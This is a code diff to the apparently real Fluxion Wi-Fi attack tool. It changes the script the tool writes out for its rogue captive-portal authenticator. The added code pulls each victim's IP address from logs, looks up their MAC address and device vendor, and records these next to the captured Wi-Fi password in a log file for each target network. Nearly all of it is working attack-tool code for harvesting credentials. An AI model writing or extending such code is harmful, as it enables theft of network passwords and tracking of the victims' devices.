@@ -836,7 +836,7 @@ while [ \$AuthenticatorState = \"running\" ]; do
         echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
     fi
 
-    if [ -f \"$FLUXIONWorkspacePath/ip_hits\" -a -s \"$FLUXIONWorkspacePath/ip_hits.txt\" ]; then
+    if [ -s \"$FLUXIONWorkspacePath/ip_hits\" ]; then
         cat \"$FLUXIONWorkspacePath/ip_hits\" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\"
         echo \" \" >> \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\"
         echo -n > \"$FLUXIONWorkspacePath/ip_hits\"
@@ -935,6 +935,22 @@ sleep 3
 
 signal_stop_attack
 
+# Resolve client IP/MAC/brand at runtime.
+ClientIP=\$(if [ -f \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\" ]; then cat \"$CaptivePortalPassLog/$targetSSIDCleanNormalized-$FluxionTargetMAC-IP.log\" | sed '/^\s*$/d' | tail -n 1; fi)
+if [ -z \"\$ClientIP\" ]; then ClientIP=\"unknown\"; fi
+if [ \"\$ClientIP\" != \"unknown\" ] && [ -f \"$FLUXIONWorkspacePath/clients.txt\" ]; then
+    ClientMAC=\$(grep \"\$ClientIP\" \"$FLUXIONWorkspacePath/clients.txt\" | awk '{print \$5}' | grep : | head -n 1 | tr [:upper:] [:lower:])
+else
+    ClientMAC=\"unknown\"
+fi
+if [ \"\$(echo \"\$ClientMAC\" | wc -m)\" != \"18\" ]; then ClientMAC=\"unknown\"; fi
+if [ \"\$ClientMAC\" != \"unknown\" ]; then
+    ClientBrand=\$(macchanger -l | grep \"\$(echo \"\$ClientMAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
+else
+    ClientBrand=\"unknown\"
+fi
+if echo \"\$ClientBrand\" | grep -q x; then ClientBrand=\"unknown\"; fi
+
 echo \"
 FLUXION $FLUXIONVersion.$FLUXIONRevision
 
@@ -944,8 +960,8 @@ Channel: $FluxionTargetChannel
 Security: $FluxionTargetEncryption
 Time: \$ih\$h:\$im\$m:\$is\$s
 Password: \$(cat $FLUXIONWorkspacePath/candidate.txt)
-Mac: $(captive_portal_get_IP_MAC) ($(captive_portal_get_MAC_brand))
-IP: $(captive_portal_get_client_IP)
+Mac: \$ClientMAC (\$ClientBrand)
+IP: \$ClientIP
 \" >\"$CaptivePortalNetLog/$targetSSIDCleanNormalized-$FluxionTargetMAC.log\"" >>"$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
 
   if [[ "$CaptivePortalAuthenticatorMode" = "hash"* ]]; then
